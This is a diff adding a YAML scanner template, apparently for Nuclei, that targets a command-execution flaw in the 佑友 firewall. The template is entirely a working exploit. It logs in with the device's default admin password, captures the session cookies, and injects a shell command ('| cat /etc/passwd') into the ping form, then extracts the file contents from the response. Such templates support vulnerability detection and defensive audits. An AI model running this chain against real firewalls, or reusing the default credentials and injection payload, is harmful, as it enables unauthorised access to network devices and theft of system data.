@@ -1,0 +1,56 @@
+id: poc-yaml-yy-firewall-rce
+info:
+  name: 佑友防火墙 后台命令执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,firewall
+  description: |
+    This template detects remote command execution vulnerabilities in the 佑友防火墙 firewall.
+http:
+  - raw:
+      - |
+        POST /index.php?c=user&a=ajax_save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        username=admin&password=hicomadmin&language=zh-cn
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, '{"success":true,"message":""}')
+    extractors:
+      - type: regex
+        name: fwsessid
+        internal: true
+        part: header
+        regex:
+          - "FWSESSID=([0-9a-z]+)"
+      - type: regex
+        name: phpsessid
+        internal: true
+        part: header
+        regex:
+          - "PHPSESSID=([0-9a-z]+)"
+  - raw:
+      - |
+        POST /index.php?c=maintain&a=ping HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: FWSESSID={{fwsessid}}; PHPSESSID={{phpsessid}}; lange=zh-cn
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        interface=&destip=127.0.0.1+%7C+cat+%2Fetc%2Fpasswd
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, 'root:')
+          - contains(body, '/bin')
+          - contains(body, 'Ping')
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*"
